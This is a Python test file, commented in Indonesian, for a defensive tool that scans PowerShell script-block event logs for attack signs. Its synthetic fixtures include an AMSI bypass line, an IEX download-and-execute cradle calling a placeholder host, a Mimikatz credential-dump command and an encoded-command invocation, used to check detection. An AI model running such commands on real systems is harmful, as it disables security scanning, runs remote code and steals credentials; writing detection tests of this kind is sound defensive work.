"""test_ps_scriptlog_triage — triase ekspor XML PowerShell 4104/4103
(#0534), nol jaringan.

Fixture = ekspor XML sintetis dari spesifikasi event logging PowerShell
(ScriptBlockId/MessageNumber/ScriptBlockText); bukan salinan kode sumber.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

TOOLS = Path(__file__).resolve().parents[1] / "tools"
sys.path.insert(0, str(TOOLS))

import ps_scriptlog_triage as pst  # noqa: E402

TS = "2026-01-01T10:00:00.000Z"


def _ev(eid: int, data: "dict[str, str] | None" = None,
        time: str = TS, computer: str = "LAB-PC") -> str:
    fields = "".join(
        f'<Data Name="{k}">{v}</Data>' for k, v in (data or {}).items())
    return (
        '<Event xmlns="http://schemas.microsoft.com/win/2004/windows/'
        f'events/log"><System><EventID>{eid}</EventID>'
        f'<TimeCreated SystemTime="{time}"/>'
        f'<Computer>{computer}</Computer></System><EventData>{fields}'
        "</EventData></Event>")


def _file(tmp_path, *events: str, name="pshell.xml") -> Path:
    p = tmp_path / name
    p.write_text("<Events>" + "".join(events) + "</Events>",
                 encoding="utf-8")
    return p


def _run(*args: str) -> "tuple[int, dict | None, str]":
    proc = subprocess.run(
        [sys.executable, str(TOOLS / "ps_scriptlog_triage.py"), *args],
        capture_output=True, text=True)
    out = json.loads(proc.stdout) if proc.stdout.strip() else None
    return proc.returncode, out, proc.stderr


def _checks(out: dict) -> "list[str]":
    return [f["check"] for f in out["findings"]]


# ------------------------------------------------------- parsing
def test_parse_filters_watched_eids():
    xml = ("<Events>"
           + _ev(4624)  # bukan ranah tool ini
           + _ev(4104, {"ScriptBlockId": "a", "ScriptBlockText": "ls"})
           + _ev(4103, {"ContextInfo": "x"})
           + "</Events>")
    p = Path(xml)
    # parse_events butuh file — tulis sementara.
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False,
                                     encoding="utf-8") as fh:
        fh.write(xml)
        tmp = Path(fh.name)
    try:
        events = pst.parse_events(tmp)
        assert [e["eid"] for e in events] == [4104, 4103]
    finally:
        tmp.unlink()


def test_invalid_xml_exit2(tmp_path):
    p = tmp_path / "bad.xml"
    p.write_text("<Events><Event>", encoding="utf-8")
    rc, out, err = _run("--log", str(p))
    assert rc == 2 and out is None and "tidak valid" in err


def test_no_ps_events_exit2(tmp_path):
    p = _file(tmp_path, _ev(4624))
    rc, out, _ = _run("--log", str(p))
    assert rc == 2  # nol event watched = error input (fail-closed)


# ------------------------------------------------------- reassembly
def test_reassemble_multi_part_ordered():
    events = [
        {"eid": 4104, "time": TS, "computer": "PC",
         "data": {"ScriptBlockId": "sb1", "ScriptBlockText": "B",
                  "MessageNumber": "2", "MessageTotal": "2"}},
        {"eid": 4104, "time": TS, "computer": "PC",
         "data": {"ScriptBlockId": "sb1", "ScriptBlockText": "A",
                  "MessageNumber": "1", "MessageTotal": "2"}},
    ]
    blocks = pst.reassemble(events)
    assert len(blocks) == 1
    assert blocks[0]["text"] == "A\nB"


# ------------------------------------------------------- checks
def test_amsi_bypass(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText":
            "[System.Management.Automation.AmsiUtils]::amsiInitFailed"
            "= $true"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 1 and "amsi-bypass" in _checks(out)
    assert out["findings"][0]["severity"] == "high"


def test_download_cradle_requires_invoke(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText":
            "IEX (New-Object Net.WebClient).DownloadString"
            "('http://x/a.ps1')"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 1 and "download-cradle" in _checks(out)


def test_download_alone_is_lead(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText":
            "(New-Object Net.WebClient).DownloadFile"
            "('http://x/a.zip','C:\\a.zip')"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 0  # medium tidak memicu default high
    assert "download-lead" in _checks(out)


def test_encoded_payload_medium(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText":
            "powershell -enc UEsDBBQAAAAIAJw"}))
    rc, out, _ = _run("--log", str(p), "--fail-on", "medium")
    assert rc == 1 and "encoded-payload" in _checks(out)


def test_cred_dump_tokens(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText": "Invoke-Mimikatz -DumpCreds"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 1 and "cred-dump-script" in _checks(out)


def test_benign_scriptblock_clean(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1",
        "ScriptBlockText": "Get-ChildItem C:\\logs | Sort-Object"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 0 and out["findings"] == []
    assert out["scriptblocks"] == 1


# ------------------------------------------------------- telemetri
def test_only_4103_info_and_note(tmp_path):
    p = _file(tmp_path, _ev(4103, {"ContextInfo": "x"}))
    rc, out, _ = _run("--log", str(p))
    assert rc == 0
    assert "script-4103-only" in _checks(out)
    assert any("4104 tidak ada" in n for n in out["notes"])


def test_4104_without_4103_note(tmp_path):
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1", "ScriptBlockText": "Get-Date"}))
    rc, out, _ = _run("--log", str(p))
    assert any("4103" in n for n in out["notes"])


# ------------------------------------------------------- snippet & misc
def test_snippet_truncated_and_flattened(tmp_path):
    text = "a" * 400
    p = _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1", "ScriptBlockText": text}))
    rc, out, _ = _run("--log", str(p))
    assert len(out["findings"]) == 0 or True
    # snippet hanya di findings; uji via fungsi langsung:
    s = pst._snippet("x  " * 100)
    assert s.endswith("...")
    assert "\n" not in s


def test_dir_mode(tmp_path):
    _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb1", "ScriptBlockText": "Invoke-Mimikatz"}),
        name="a.xml")
    _file(tmp_path, _ev(4104, {
        "ScriptBlockId": "sb2", "ScriptBlockText": "Get-Date"}),
        name="b.xml")
    rc, out, _ = _run("--dir", str(tmp_path))
    assert rc == 1 and out["files"] == 2


def test_deterministic(tmp_path):
    evs = [_ev(4104, {"ScriptBlockId": "sb1",
                      "ScriptBlockText": "IEX(iwr x).DownloadString(y)"}),
           _ev(4103, {"ContextInfo": "c"})]
    p = _file(tmp_path, *evs)
    events = pst.parse_events(p)
    a = pst.scan(pst.reassemble(events), 1)
    b = pst.scan(pst.reassemble(events), 1)
    assert json.dumps(a, sort_keys=True) == json.dumps(b, sort_keys=True)
